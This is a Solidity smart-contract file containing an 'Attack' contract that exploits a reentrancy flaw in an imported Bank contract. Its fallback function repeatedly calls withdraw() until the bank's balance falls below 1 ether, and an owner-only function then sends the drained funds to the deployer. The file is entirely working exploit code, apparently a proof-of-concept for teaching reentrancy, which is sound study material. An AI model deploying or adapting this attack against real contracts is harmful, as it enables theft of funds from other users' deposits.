// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "./Bank.sol";

contract Attack {
    Bank public bank;
    uint256 public constant AMOUNT = 1 ether;
    address public owner;

    constructor(address _bankAddress) {
        bank = Bank(_bankAddress);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Contract caller isn't owner");
        _;
    }

    // Fallback is called when Bank sends Ether to this contract.
    fallback() external payable {
        if (address(bank).balance >= AMOUNT) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        bank.deposit{value: AMOUNT}();
        bank.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalanceAtack() public view returns (uint) {
        return address(this).balance;
    }

    function withdrawOwnerAttack() external payable onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
